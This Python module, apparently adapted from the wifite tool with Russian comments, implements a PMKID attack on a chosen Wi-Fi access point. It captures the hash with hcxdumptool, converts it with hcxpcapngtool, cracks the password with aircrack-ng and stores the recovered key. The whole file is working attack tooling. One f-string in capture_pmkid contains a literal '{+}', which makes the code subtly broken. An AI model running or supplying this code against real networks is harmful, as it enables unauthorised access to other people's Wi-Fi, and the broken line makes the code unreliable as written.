#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..util.color import Color
from ..config import Configuration
from ..tools.aircrack import Aircrack
import os
import re
import time
import subprocess

class AttackPMKID(Attack):
    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.pcapng_file = Configuration.temp('pmkid.pcapng')
        self.hash_file = Configuration.temp('pmkid.22000')
        self.success = False
        self.timer = None

    @staticmethod
    def get_existing_pmkid_file(bssid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None
        bssid = bssid.lower().replace(':', '')
        file_re = re.compile(r'.*pmkid_.*\.22000')
        for filename in os.listdir(Configuration.wpa_handshake_dir):
            pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if not os.path.isfile(pmkid_filename):
                continue
            if not re.match(file_re, pmkid_filename):
                continue
            with open(pmkid_filename, 'r') as pmkid_handle:
                pmkid_hash = pmkid_handle.read().strip()
                if pmkid_hash.count('*') < 3:
                    continue
                existing_bssid = pmkid_hash.split('*')[1].lower().replace(':', '')
                if existing_bssid == bssid:
                    return pmkid_filename
        return None

    def run_aircrack(self):
        if Configuration.dont_use_pmkid:
            self.success = False
            return False

        pmkid_file = None
        # 1. Ищем существующий PMKID
        if not Configuration.ignore_old_handshakes:
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                              'Загружен {C}существующий{W} PMKID hash: {C}%s{W}\n' % pmkid_file)
        # 2. Если нет — пробуем захватить новый
        if pmkid_file is None:
            pmkid_file = self.capture_pmkid()
        if pmkid_file is None or not os.path.isfile(pmkid_file):
            Color.pl('{!} Хэш PMKID не найден или файл пустой')
            return False
        # 3. Если есть опция skip_crack — выходим
        if Configuration.skip_crack:
            Color.pl('{+} Подбор PMKID пропущен из-за {C}skip-crack{W}')
            self.success = False
            return True
        # 4. Пытаемся подобрать пароль через aircrack-ng
        key = Aircrack.crack_pmkid(pmkid_file, verbose=True)
        if key:
            Color.pl('{+} Ключ найден: {G}%s{W}' % key)
            from ..model.pmkid_result import CrackResultPMKID
            result = CrackResultPMKID(self.target.bssid, self.target.essid, pmkid_file, key)
            result.save()
            self.crack_result = result
            self.success = True
            return True
        else:
            Color.pl('{!} Ключ не найден в файле PMKID. Переходим к попытке захвата handshake.')
            self.success = False
            return False

    def capture_pmkid(self):
        iface = Configuration.interface
        bssid = self.target.bssid
        Color.pl(f'{+} Захват PMKID через hcxdumptool на интерфейсе {iface}...')
        try:
            # 1. Запуск hcxdumptool на 30 секунд по BSSID
            cmd = [
                'timeout', '30', 'hcxdumptool',
                '-i', iface,
                '-o', self.pcapng_file,
                '--enable_status=1',
                '-t', bssid
            ]
            Color.pl('{+} Запуск: ' + ' '.join(cmd))
            subprocess.run(cmd, check=True)
        except Exception as e:
            Color.pl('{!} Ошибка запуска hcxdumptool: %s' % e)
            return None

        # 2. Конвертация pcapng в 22000 через hcxpcapngtool
        try:
            cmd_hash = [
                'hcxpcapngtool',
                '-o', self.hash_file,
                self.pcapng_file
            ]
            Color.pl('{+} Конвертация: ' + ' '.join(cmd_hash))
            subprocess.run(cmd_hash, check=True)
        except Exception as e:
            Color.pl('{!} Ошибка конвертации через hcxpcapngtool: %s' % e)
            return None

        if os.path.exists(self.hash_file) and os.path.getsize(self.hash_file) > 0:
            Color.pl('{+} Получен PMKID hash: %s' % self.hash_file)
            return self.hash_file
        else:
            Color.pl('{!} PMKID hash не получен')
            return None

    def run(self):
        result = self.run_aircrack()
        # Если не удалось подобрать PMKID, вернём False — основной цикл wifite попробует handshake!
        return result
